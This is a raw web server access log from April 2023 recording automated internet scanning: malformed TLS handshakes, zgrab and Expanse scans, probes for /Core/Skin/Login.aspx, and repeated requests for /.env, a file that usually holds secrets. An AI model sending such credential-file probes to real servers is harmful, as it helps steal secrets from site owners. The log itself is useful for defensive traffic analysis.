localhost:80 205.210.31.185 - - [29/Apr/2023:02:28:37 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 2.238.199.60 - - [29/Apr/2023:02:39:22 +0000] "GET / HTTP/1.0" 200 22396 "-" "-"
localhost:80 193.32.162.159 - - [29/Apr/2023:02:45:19 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 45.79.181.251 - - [29/Apr/2023:02:56:06 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 81.213.111.207 - - [29/Apr/2023:03:19:57 +0000] "GET / HTTP/1.0" 200 22396 "-" "-"
localhost:80 43.154.128.189 - - [29/Apr/2023:03:33:44 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 192.241.213.74 - - [29/Apr/2023:03:43:45 +0000] "GET / HTTP/1.1" 200 6288 "-" "Mozilla/5.0 zgrab/0.x"
localhost:80 135.125.244.48 - - [29/Apr/2023:03:44:05 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.244.48 - - [29/Apr/2023:03:44:05 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 35.233.62.116 - - [29/Apr/2023:04:04:17 +0000] "GET / HTTP/1.1" 200 6343 "-" "python-requests/2.28.2"
localhost:80 142.93.218.102 - - [29/Apr/2023:04:04:30 +0000] "GET / HTTP/1.1" 200 6343 "-" "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36"
localhost:80 193.32.162.159 - - [29/Apr/2023:04:35:23 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 43.154.128.189 - - [29/Apr/2023:04:52:17 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 205.210.31.133 - - [29/Apr/2023:04:56:47 +0000] "GET / HTTP/1.1" 200 22418 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
localhost:80 45.79.181.223 - - [29/Apr/2023:05:00:55 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 135.125.244.48 - - [29/Apr/2023:05:01:23 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
